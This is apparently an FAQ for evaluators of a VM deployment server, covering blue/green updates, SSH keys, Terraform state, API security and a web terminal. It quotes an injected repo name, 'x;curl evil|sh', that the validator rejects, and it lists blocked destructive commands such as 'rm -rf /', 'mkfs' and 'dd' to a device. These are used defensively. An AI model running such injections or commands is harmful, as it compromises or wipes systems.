# Likely evaluator questions, with answers from the code

File references are to the repository root.

**1. How do zero-downtime updates actually work?**
`server/blue-green-service.js` generates an update script that the server sends to the VM over SSH (`server/vm-ops-service.js`). For a Dockerfile app it works like this:
1. It fetches the branch and builds the image `<repo>:<commit>`.
2. It starts the image in the idle slot, on its own port bound to `127.0.0.1`.
3. It polls that port locally for up to 90 s.
4. If the app answers below HTTP 500, it rewrites the NGINX `proxy_pass` port, runs `nginx -t` and a graceful `systemctl reload nginx`, waits 5 s to drain, and removes the old slot.
5. If the check fails, it removes the new container and exits. The old slot keeps serving and the dashboard shows "previous version is still serving".

Other stacks are updated differently:
- **Compose apps:** `docker compose up -d --build`.
- **systemd apps (Node/Python):** reinstall dependencies and restart the service. This one has a short restart gap.

**2. Has blue/green been tested?**
Yes, locally. The real update script ran against a fake VM filesystem with stubbed `docker`, `nginx` and `systemctl` and a real git remote.
- It switched blue→green and green→blue, and the NGINX config and state file changed correctly.
- A failing health check (HTTP 503) kept the old slot and left NGINX untouched.

It hasn't yet run on a cloud VM, so "0 s downtime" is the design target, not a measured number.

**3. How does the server talk to the VMs?**
Every deployment gets its own 3072-bit RSA key pair, generated with Node's `crypto`:
- **Public key:** goes into the startup script, which creates a `devlups` operator user.
- **Private key:** encrypted with AES-256-GCM in SQLite. For each SSH call it's written to a 0600 temp file and deleted afterwards.

The same layer streams the build log (`tail -F`), reads metrics, runs updates, enables HTTPS and serves the web terminal. VMs created before this change fall back to `gcloud compute ssh` with the deployment's own service-account key.

**4. Where does Terraform keep state? Can two deployments clash?**
Each GCP deployment gets its own working directory, `data/terraform/dep-<id>/`, with its own state (`server/terraform-runner.js`). The runner does `terraform init` itself (with a shared plugin cache). The service-account key is passed as `TF_VAR_credentials` in the environment, so it's never written to disk by the runner. `POST /api/deployments/:id/destroy` runs `terraform destroy` in that directory. AWS, Azure and DigitalOcean have equivalent teardown: terminate the instance plus its security group and key, delete the resource group, or delete the Droplet.

**5. How do you decide an app is "healthy"?**
`server/health-service.js` probes `http://<vm-ip>` on port 80, which is the NGINX front door users actually hit, not the app port. A status from 200 to 399 counts as healthy, unless the body is NGINX's default "Welcome to nginx!" page. After a deploy it probes every 10 s, up to 60 times. A reconciler then runs every 60 s: two consecutive failures mark the deployment `degraded`, the record is kept, and it returns to `ready` on recovery.

**6. How is the API secured?**
- **Signed-in users only:** every `/api` route needs a user, except sign-in, `/api/health`, `/api/pricing` and the webhook. Passwords use PBKDF2-SHA256 (50,000 iterations); sessions are HMAC-SHA256 tokens.
- **Token signing key:** comes from `JWT_SECRET`, or from the AES master key generated on first start. It's never a hard-coded constant.
- **Google sign-in:** the ID token is verified with Google, and the audience and verified-email flag are checked. Email-only sign-in exists only with `ALLOW_DEV_LOGIN=true`.
- **Who can sign up:** only the first account (the owner). Others need `ALLOWED_EMAILS` or `ALLOWED_EMAIL_DOMAINS`.
- **GitHub bot:** authenticates with `DEPLOYMENT_API_TOKEN`. The webhook endpoint rejects anything without a valid `X-Hub-Signature-256`.
- **Responses:** API responses never contain decrypted PATs, env vars or SSH private keys.

**7. Can a user inject commands through the deployment form?**
No. Everything that ends up in the VM script is checked against strict patterns before anything runs:
- repository name, Git user, branch, repo URL, token format;
- routes, ports, domain, email, zone and machine type;
- the database add-on, which must come from a fixed list.

`x;curl evil|sh` as a repo name returns HTTP 400 (tested). The AWS and Azure services call their CLIs with argument arrays (`execFile`), not shell strings.

**8. Is the web terminal safe?**
It runs on the deployment's own VM over SSH, not on the Deployment Server host:
- it starts in `/opt/<repo>`;
- it times out after 20 s;
- destructive patterns (`rm -rf /`, `mkfs`, fork bomb, `shutdown`, `reboot`, `dd` to a device) are blocked;
- every command is logged with the user;
- output passes through the token sanitiser.

It is root on *your own* VM by design, like an SSH session.

**9. What are the live metrics based on?**
A small script reads the VM's own counters over SSH:
- **CPU:** `/proc/stat`, sampled over 1 s.
- **Memory:** `/proc/meminfo` (MemAvailable).
- **Disk:** `df /`.
- **Network:** the primary interface's byte counters (the server turns two samples into KB/s).
- **Also:** uptime, load and the Docker container count.

The server caches results for 10 s per deployment, so the dashboard can't flood the VM with SSH calls.

**10. How does stack detection decide?**
It takes the first match within two directory levels:
1. Compose file
2. Dockerfile (port from `EXPOSE`)
3. `package.json`: Next.js runs as a service, Vite's `dist/` is served by NGINX, anything else runs `npm start` under systemd
4. Python: Django, FastAPI or Flask, in a venv under systemd
5. `index.html` (static)
6. a placeholder page

The mode is recorded in `/var/lib/devlups/<repo>/state.env`, which tells later updates what to do.

**11. What happens when a VM reboots?**
GCP re-runs startup scripts on every boot. The script checks for its "deployed" marker and then only starts Docker, NGINX and the app service. It never re-clones (tested). Containers use `--restart unless-stopped`, and systemd services are enabled at boot.

**12. How do private repositories work?**
The PAT is stored encrypted and used only for the clone. Afterwards the remote URL is reset, so the token is not left in `.git/config`. Updates pass it per request over SSH, and logs mask it. Limitation: it is still visible in the VM's startup-script metadata or user-data.

**13. How does HTTPS work without a custom domain?**
The VM looks up its public IP from the provider's metadata service (with a fallback). It then builds `<repo>.<ip>.sslip.io`, a public wildcard DNS name. Certbot (`--nginx --redirect`) gets a Let's Encrypt certificate and the renewal timer is enabled. A failed certificate request no longer aborts the deployment; the app stays on HTTP. HTTPS can also be enabled later on any provider with `POST /api/deployments/:id/ssl`.

**14. How does "cheapest" provider selection work?**
`server/pricing-service.js` holds a list-price table per provider and machine tier. `selectCheapestProvider` picks the lowest monthly price among your verified credentials. These are list prices, not live prices.

**15. Why SQLite, and does it scale?**
It needs no infrastructure (Node 22's built-in `node:sqlite`) and fits a single-process control plane. Several server instances or queue workers would need Postgres, which is listed as future work together with a job queue.

**16. What is still not done?**
- Live end-to-end runs on AWS, Azure and DigitalOcean. Their code paths are implemented, and the shared startup script was tested locally.
- A job queue for many concurrent deployments.
- Static IPs and managed DNS.
- Alerting.
- Per-workspace roles.
